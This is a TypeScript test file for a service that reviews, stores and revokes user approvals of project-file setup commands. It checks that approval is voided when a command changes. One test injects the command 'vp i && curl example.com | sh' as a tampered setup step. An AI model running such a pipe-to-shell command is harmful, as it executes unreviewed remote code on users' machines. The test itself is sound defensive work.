import * as NodeServices from "@effect/platform-node/NodeServices";
import { assert, describe, it } from "@effect/vitest";
import { ProjectId } from "@t3tools/contracts";
import { projectFileApprovalKey } from "@t3tools/shared/projectFileApprovals";
import { resolveProjectActions } from "@t3tools/shared/projectScripts";
import * as Effect from "effect/Effect";
import * as Exit from "effect/Exit";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import * as Option from "effect/Option";
import * as Path from "effect/Path";

import * as ServerSettings from "../serverSettings.ts";
import * as ProjectConfigLoader from "./ProjectConfigLoader.ts";
import * as ProjectFileActionApprovals from "./ProjectFileActionApprovals.ts";
import * as ProjectService from "./ProjectService.ts";

const projectId = ProjectId.make("project:approvals");

const projectAt = (workspaceRoot: string) => ({
  id: projectId,
  title: "Approvals",
  workspaceRoot,
  repositoryIdentity: null,
  faviconPath: null,
  defaultModelSelection: null,
  scripts: [],
  createdAt: "2026-10-21T00:00:00.000Z",
  updatedAt: "2026-10-21T00:00:00.000Z",
  deletedAt: null,
});

/** A temp project root holding `files`, with the approvals service over it. */
const withProject = <A, E>(
  files: Record<string, string>,
  body: (
    root: string,
  ) => Effect.Effect<
    A,
    E,
    | ProjectFileActionApprovals.ProjectFileActionApprovals
    | ServerSettings.ServerSettingsService
    | FileSystem.FileSystem
    | Path.Path
  >,
  options: { readonly projectExists?: boolean } = {},
) =>
  Effect.gen(function* () {
    const fileSystem = yield* FileSystem.FileSystem;
    const path = yield* Path.Path;
    const root = yield* fileSystem.makeTempDirectoryScoped({ prefix: "styal-approvals-" });
    for (const [name, contents] of Object.entries(files)) {
      yield* fileSystem.makeDirectory(path.dirname(path.join(root, name)), { recursive: true });
      yield* fileSystem.writeFileString(path.join(root, name), contents);
    }
    const dependencies = Layer.mergeAll(
      ProjectConfigLoader.layer,
      ServerSettings.layerTest(),
      Layer.mock(ProjectService.ProjectService)({
        getById: () =>
          Effect.succeed(
            options.projectExists === false ? Option.none() : Option.some(projectAt(root)),
          ),
      }),
    );
    const service = ProjectFileActionApprovals.layer.pipe(Layer.provideMerge(dependencies));
    return yield* body(root).pipe(Effect.provide(service));
  }).pipe(Effect.scoped, Effect.provide(NodeServices.layer));

const styalJson = (actions: ReadonlyArray<Record<string, unknown>>) => JSON.stringify({ actions });
const setupAction = (command: string) => ({
  id: "setup",
  name: "Setup",
  command,
  runOnWorktreeCreate: true,
  runOnSettle: true,
});
const input = { projectId, actionId: "setup" };

describe("ProjectFileActionApprovals", () => {
  it.effect("reviews the file's command and roles before any approval", () =>
    withProject({ "styal.json": styalJson([setupAction("vp i")]) }, () =>
      Effect.gen(function* () {
        const approvals = yield* ProjectFileActionApprovals.ProjectFileActionApprovals;
        assert.deepEqual(yield* approvals.review(input), {
          actionId: "setup",
          name: "Setup",
          command: "vp i",
          roles: ["setup", "settle"],
          approved: null,
          hint: { kind: "none" },
        });
      }),
    ),
  );

  it.effect("names at most two existing files the command runs", () =>
    withProject(
      {
        "styal.json": styalJson([
          setupAction("./scripts/setup.sh && bash scripts/a.sh && bash scripts/b.sh missing.sh"),
        ]),
        "scripts/setup.sh": "#!/bin/sh\n",
        "scripts/a.sh": "#!/bin/sh\n",
        "scripts/b.sh": "#!/bin/sh\n",
      },
      () =>
        Effect.gen(function* () {
          const approvals = yield* ProjectFileActionApprovals.ProjectFileActionApprovals;
          assert.deepEqual((yield* approvals.review(input)).hint, {
            kind: "files",
            paths: ["scripts/setup.sh", "scripts/a.sh"],
          });
        }),
    ),
  );

  it.effect("names a package.json script only when it exists", () =>
    Effect.gen(function* () {
      const hintFor = (command: string) =>
        withProject(
          {
            "styal.json": styalJson([setupAction(command)]),
            "package.json": JSON.stringify({ scripts: { setup: "node setup.mjs" } }),
          },
          () =>
            Effect.flatMap(ProjectFileActionApprovals.ProjectFileActionApprovals, (approvals) =>
              Effect.map(approvals.review(input), (review) => review.hint),
            ),
        );
      assert.deepEqual(yield* hintFor("pnpm run setup"), {
        kind: "package-script",
        script: "setup",
      });
      assert.deepEqual(yield* hintFor("pnpm run teardown"), { kind: "none" });
      assert.deepEqual(yield* hintFor("bash scripts/missing.sh"), { kind: "none" });
    }),
  );

  it.effect("stores the exact command and declared roles, and voids them when it changes", () =>
    withProject({ "styal.json": styalJson([setupAction("vp i")]) }, (root) =>
      Effect.gen(function* () {
        const approvals = yield* ProjectFileActionApprovals.ProjectFileActionApprovals;
        const settingsService = yield* ServerSettings.ServerSettingsService;
        const fileSystem = yield* FileSystem.FileSystem;
        const path = yield* Path.Path;
        const approved = yield* approvals.setApproved({ ...input, approved: true });
        assert.deepEqual(approved.approved?.command, "vp i");
        assert.deepEqual(approved.approved?.roles, ["setup", "settle"]);

        const key = projectFileApprovalKey(projectAt(root));
        const settings = yield* settingsService.getSettings;
        assert.deepEqual(settings.projectFileActionApprovals[key]?.setup?.command, "vp i");

        const actionsFor = Effect.gen(function* () {
          const config = yield* approvals.automationConfig(projectAt(root));
          return resolveProjectActions(yield* settingsService.getSettings, projectAt(root), config);
        });
        const [before] = yield* actionsFor;
        assert.equal(before?.runOnWorktreeCreate, true);
        assert.equal(before?.runOnSettle, true);
        assert.equal(before?.awaitingApproval, undefined);

        yield* fileSystem.writeFileString(
          path.join(root, "styal.json"),
          styalJson([setupAction("vp i && curl example.com | sh")]),
        );
        const [after] = yield* actionsFor;
        assert.equal(after?.runOnWorktreeCreate, false);
        assert.deepEqual(after?.awaitingApproval, ["setup", "settle"]);
      }),
    ),
  );

  it.effect("revokes an approval and drops the repository's empty map", () =>
    withProject({ "styal.json": styalJson([setupAction("vp i")]) }, (root) =>
      Effect.gen(function* () {
        const approvals = yield* ProjectFileActionApprovals.ProjectFileActionApprovals;
        const settingsService = yield* ServerSettings.ServerSettingsService;
        yield* approvals.setApproved({ ...input, approved: true });
        const revoked = yield* approvals.setApproved({ ...input, approved: false });
        assert.equal(revoked.approved, null);
        const settings = yield* settingsService.getSettings;
        assert.equal(
          Object.hasOwn(
            settings.projectFileActionApprovals,
            projectFileApprovalKey(projectAt(root)),
          ),
          false,
        );
      }),
    ),
  );

  it.effect("refuses missing projects and actions, and actions that never run on their own", () =>
    Effect.gen(function* () {
      const reasonOf = <A>(
        effect: Effect.Effect<A, { readonly reason: string }>,
      ): Effect.Effect<string | null> =>
        Effect.map(Effect.exit(effect), (exit) =>
          Exit.isFailure(exit)
            ? (exit.cause.reasons.find((reason) => reason._tag === "Fail")?.error.reason ?? null)
            : null,
        );
      const files = {
        "styal.json": styalJson([{ id: "test", name: "Test", command: "vp test" }]),
      };
      const run = (
        body: (
          approvals: ProjectFileActionApprovals.ProjectFileActionApprovals["Service"],
        ) => Effect.Effect<string | null>,
        projectExists = true,
      ) =>
        withProject(
          files,
          () => Effect.flatMap(ProjectFileActionApprovals.ProjectFileActionApprovals, body),
          { projectExists },
        );
      assert.equal(
        yield* run((approvals) => reasonOf(approvals.review({ projectId, actionId: "gone" }))),
        "action-not-found",
      );
      assert.equal(
        yield* run(
          (approvals) => reasonOf(approvals.review({ projectId, actionId: "test" })),
          false,
        ),
        "project-not-found",
      );
      assert.equal(
        yield* run((approvals) =>
          reasonOf(approvals.setApproved({ projectId, actionId: "test", approved: true })),
        ),
        "nothing-to-approve",
      );
    }),
  );
});
